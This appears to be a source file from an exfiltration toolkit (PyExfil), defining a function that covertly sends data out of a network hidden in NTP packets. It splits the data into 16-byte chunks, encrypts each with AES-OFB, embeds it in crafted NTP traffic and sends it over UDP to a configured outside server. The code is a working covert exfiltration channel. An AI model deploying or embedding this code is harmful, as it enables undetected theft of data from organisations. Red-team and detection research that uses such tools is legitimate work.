#!/usr/bin/env python2.7

import socket

from pyexfil.Comm.NTP_Body.ntp_consts import *
from pyexfil.includes.prepare import _splitString
from pyexfil.includes.encryption_wrappers import AESEncryptOFB, AESDecryptOFB


def Broadcast(data, to=SERVER, port=NTP_PORT, key=KEY):
	"""
    Send message out to server
    :param data: Data to send to server [str]
    :param to: IP/DNS of server [str]
	:param port: Server's Port [int]
    :param key: Key for AES-OFB mode. [str]
    :return: Boolean
    """
	
	if len(data) > 16:
		chunks = _splitString(stri=data, length=16)
	else:
		chunks = [data]

	for chunk in chunks:
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		addr = (to, port)

		pyld = _buildNTP()
		tmp = AESEncryptOFB(key=key, text=chunk)
		pyld += tmp  # 4 Timezones (ref, original, recv, transmit)

		sock.sendto(pyld, addr)
	return True
